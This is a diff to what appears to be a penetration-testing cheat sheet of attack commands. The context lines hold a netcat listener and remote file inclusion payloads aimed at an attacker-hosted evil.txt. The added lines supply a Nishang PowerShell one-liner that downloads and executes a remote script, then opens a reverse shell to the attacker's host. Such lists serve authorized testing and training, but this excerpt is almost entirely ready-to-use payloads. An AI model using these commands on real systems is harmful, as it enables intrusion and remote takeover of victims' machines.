@@ -1739,6 +1739,9 @@ sudo nc -lnvp {PORT}
 page.php?page=http://{LHOST}/evil.txt&cmd={command}
 page.php?file=http://{LHOST}/evil.txt&cmd={command}
 
+# Windows Nishang Reverse shell
+powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://{LHOST}/rev.ps1\"); Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT} | powershell -noprofile"
+
 # MSFVENOM Payloads
 
 # Windows
